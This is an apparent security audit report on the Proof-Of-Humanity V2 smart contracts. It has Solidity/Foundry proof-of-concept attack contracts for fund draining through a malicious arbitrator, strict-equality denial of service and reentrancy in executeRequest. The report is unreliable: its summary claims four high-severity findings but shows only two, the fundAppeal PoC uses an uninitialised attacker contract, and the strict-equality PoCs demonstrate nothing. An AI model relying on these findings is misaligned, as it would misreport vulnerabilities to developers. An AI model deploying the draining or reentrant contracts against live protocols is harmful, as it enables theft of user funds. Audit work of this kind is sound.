# Proof-Of-Humanity V2 Security Audit Report

## Executive Summary

This security audit report analyzes the Proof-Of-Humanity V2 protocol, focusing on critical vulnerabilities identified through static analysis and manual review. The audit identified several high and medium severity issues primarily related to arbitrary ETH transfers, strict equality checks, and reentrancy vulnerabilities.

**Key Findings Summary:**
- 4 High Severity Issues
- 3 Medium Severity Issues
- Multiple instances of dangerous patterns across core contracts

The most critical findings involve potential fund drainage through arbitrary ETH transfers to malicious arbitrators and strict equality checks that could lead to denial of service attacks.

## High Severity Findings

### H-01: Arbitrary ETH Transfer to Malicious Arbitrator in challengeRequest

**Severity:** High
**Location:** `ProofOfHumanity.sol#1005-1071`, `ProofOfHumanityExtended.sol#1034-1100`

**Description:**
The `challengeRequest` function sends ETH to an arbitrary arbitrator contract without proper validation. A malicious governor could set a malicious arbitrator that drains the contract's funds or performs reentrancy attacks.

**Impact:**
- Complete drainage of ETH funds from the contract
- Potential reentrancy attacks during dispute creation
- Loss of user deposits and challenge fees

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/ProofOfHumanity.sol";

contract MaliciousArbitrator {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function createDispute(uint256 _choices, bytes calldata _extraData) 
        external 
        payable 
        returns (uint256) 
    {
        // Drain all ETH sent to this contract
        payable(owner).transfer(address(this).balance);
        return 1; // Return fake dispute ID
    }
    
    function arbitrationCost(bytes calldata _extraData) 
        external 
        pure 
        returns (uint256) 
    {
        return 1 ether; // High arbitration cost to drain more funds
    }
}

contract ProofOfHumanityExploit is Test {
    ProofOfHumanity public poh;
    MaliciousArbitrator public maliciousArbitrator;
    address public attacker = address(0x123);
    address public governor = address(0x456);
    
    function setUp() public {
        vm.startPrank(governor);
        poh = new ProofOfHumanity();
        maliciousArbitrator = new MaliciousArbitrator();
        
        // Set malicious arbitrator
        poh.addArbitrator(maliciousArbitrator, "");
        vm.stopPrank();
        
        // Fund the contract
        vm.deal(address(poh), 10 ether);
    }
    
    function testArbitraryETHTransfer() public {
        bytes20 humanityId = bytes20(keccak256("testHumanity"));
        
        // Attacker challenges a request, draining funds
        vm.startPrank(attacker);
        vm.deal(attacker, 2 ether);
        
        uint256 initialBalance = address(maliciousArbitrator.owner()).balance;
        
        // This will send 1 ether to the malicious arbitrator
        poh.challengeRequest{value: 1 ether}(
            humanityId,
            0,
            ProofOfHumanity.Reason.None,
            "malicious challenge"
        );
        
        uint256 finalBalance = address(maliciousArbitrator.owner()).balance;
        
        // Verify funds were drained
        assertGt(finalBalance, initialBalance, "Funds not drained by malicious arbitrator");
        vm.stopPrank();
    }
}
```

**Recommendation:**
1. Implement a whitelist of trusted arbitrators
2. Add validation to ensure arbitrator contracts are legitimate
3. Implement circuit breaker mechanisms for large fund transfers
4. Consider using pull payment patterns instead of push payments

### H-02: Arbitrary ETH Transfer in fundAppeal Function

**Severity:** High
**Location:** `ProofOfHumanity.sol#1088-1143`, `ProofOfHumanityExtended.sol#1117-1172`

**Description:**
The `fundAppeal` function sends ETH to an arbitrator without proper validation of the arbitrator's legitimacy, enabling fund drainage.

**Impact:**
- Loss of appeal funding
- Potential contract fund drainage
- Manipulation of appeal process

**Proof of Concept:**

```solidity
contract FundAppealExploit is Test {
    ProofOfHumanity public poh;
    MaliciousArbitrator public maliciousArbitrator;
    
    function testFundAppealDrain() public {
        // Setup similar to previous test
        
        address challenger = address(0x789);
        vm.deal(challenger, 5 ether);
        vm.startPrank(challenger);
        
        // Fund appeal that will drain to malicious arbitrator
        poh.fundAppeal{value: 2 ether}(
            address(0x111), // arbitrary address
            1, // dispute ID
            ProofOfHumanity.Party.Requester
        );
        
        // Verify funds drained
        assertTrue(address(maliciousArbitrator.owner()).balance > 0);
        vm.stopPrank();
    }
}
```

**Recommendation:**
- Implement the same arbitrator validation as recommended for H-01
- Add reentrancy guards to prevent manipulation during appeal funding

## Medium Severity Findings

### M-01: Dangerous Strict Equality Check in ccGrantHumanity

**Severity:** Medium
**Location:** `ProofOfHumanityExtended.sol#503-527`

**Description:**
The contract uses strict equality (`== 0`) to check if an account has no pending requests. This can be manipulated to cause denial of service by incrementing the request count through failed transactions.

**Impact:**
- Denial of service for legitimate users
- Potential griefing attacks
- Disruption of the humanity granting process

**Proof of Concept:**

```solidity
contract StrictEqualityExploit is Test {
    ProofOfHumanityExtended public pohExt;
    
    function setUp() public {
        pohExt = new ProofOfHumanityExtended();
    }
    
    function testStrictEqualityDOS() public {
        address victim = address(0x123);
        bytes20 humanityId = bytes20(keccak256("victim"));
        
        // Simulate manipulation of requestCount
        // This could happen through failed request attempts or other edge cases
        
        vm.startPrank(victim);
        
        // If requestCount is manipulated to be != 0 through edge cases,
        // ccGrantHumanity will always fail
        vm.expectRevert();
        pohExt.ccGrantHumanity(humanityId, victim, uint40(block.timestamp + 1000));
        
        vm.stopPrank();
    }
}
```

**Recommendation:**
- Use `<= MAX_ALLOWED_REQUESTS` instead of strict equality
- Implement proper bounds checking
- Add mechanisms to reset manipulated counters

### M-02: Dangerous Strict Equality in _requestHumanity

**Severity:** Medium
**Location:** `ProofOfHumanity.sol#1406-1429`, `ProofOfHumanityExtended.sol#1447-1470`

**Description:**
Similar to M-01, the `_requestHumanity` function uses dangerous strict equality checks that can be exploited for denial of service.

**Impact:**
- Prevention of legitimate humanity requests
- Griefing attacks against specific users
- System unavailability for affected accounts

**Proof of Concept:**

```solidity
contract RequestHumanityDOS is Test {
    ProofOfHumanity public poh;
    
    function testRequestHumanityStrictEquality() public {
        address user = address(0x456);
        bytes20 humanityId = bytes20(keccak256("user"));
        
        vm.startPrank(user);
        
        // If internal state is manipulated so requestCount[user] != 0
        // All future requests will fail
        vm.expectRevert("Account already has a pending request");
        poh.requestHumanity(humanityId, "", "");
        
        vm.stopPrank();
    }
}
```

**Recommendation:**
- Replace strict equality with range checks
- Implement request cleanup mechanisms
- Add admin functions to resolve stuck states

### M-03: Reentrancy in executeRequest Function

**Severity:** Medium
**Location:** `ProofOfHumanityExtended.sol#1186-1215`

**Description:**
The `executeRequest` function makes external calls to `forkModule.remove()` before updating internal state, creating a reentrancy vulnerability.

**Impact:**
- State manipulation during execution
- Potential double-spending of rewards
- Inconsistent contract state

**Proof of Concept:**

```solidity
contract ReentrantForkModule {
    ProofOfHumanityExtended public target;
    bool public attacked = false;
    
    constructor(address _target) {
        target = ProofOfHumanityExtended(_target);
    }
    
    function remove(address _humanityId) external {
        if (!attacked) {
            attacked = true;
            // Reenter during execution
            target.executeRequest(bytes20(uint160(_humanityId)), 0);
        }
    }
}

contract ReentrancyExploit is Test {
    ProofOfHumanityExtended public pohExt;
    ReentrantForkModule public maliciousFork;
    
    function testReentrancyInExecute() public {
        pohExt = new ProofOfHumanityExtended();
        maliciousFork = new ReentrantForkModule(address(pohExt));
        
        // Set malicious fork module
        vm.prank(pohExt.governor());
        pohExt.setForkModule(address(maliciousFork));
        
        bytes20 humanityId = bytes20(address(0x123));
        
        // This should trigger reentrancy
        pohExt.executeRequest(humanityId, 0);
        
        assertTrue(maliciousFork.attacked(), "Reentrancy attack executed");
    }
}
```

**Recommendation:**
- Implement reentrancy guards using OpenZeppelin's `ReentrancyGuard`
- Follow checks-effects-interactions pattern
- Update state before external calls

## Low/Informational Findings

### L-01: Missing Input Validation

**Location:** Multiple functions across contracts

**Description:**
Several functions lack proper input validation, which could lead to unexpected behavior or gas waste.

**Recommendation:**
- Add comprehensive input validation
- Implement proper bounds checking
- Add zero-address checks where applicable

### L-02: Lack of Event Emissions

**Location:** Various state-changing functions

**Description:**
Some critical state changes don't emit events, making it difficult to track contract behavior.

**Recommendation:**
- Add comprehensive event emissions for all state changes
- Include relevant parameters in events for better monitoring

## Conclusion

The Proof-Of-Humanity V2 protocol contains several critical vulnerabilities that could lead to fund loss and system manipulation. The most severe issues involve arbitrary ETH transfers to potentially malicious arbitrators and dangerous strict equality checks that enable denial of service attacks.

**Priority Recommendations:**
1. **Immediate:** Implement arbitrator whitelisting and validation
2. **High:** Replace strict equality checks with safer alternatives  
3. **Medium:** Add reentrancy protection to all external calls
4. **Low:** Improve input validation and event emissions

The protocol should undergo thorough testing and additional security reviews before deployment, particularly focusing on the arbitrator interaction mechanisms and state management patterns.

**Risk Assessment:**
- **High Risk:** Fund drainage through malicious arbitrators
- **Medium Risk:** System unavailability through DoS attacks
- **Low Risk:** Operational issues and monitoring difficulties

All identified issues should be addressed before mainnet deployment to ensure user fund safety and system reliability.
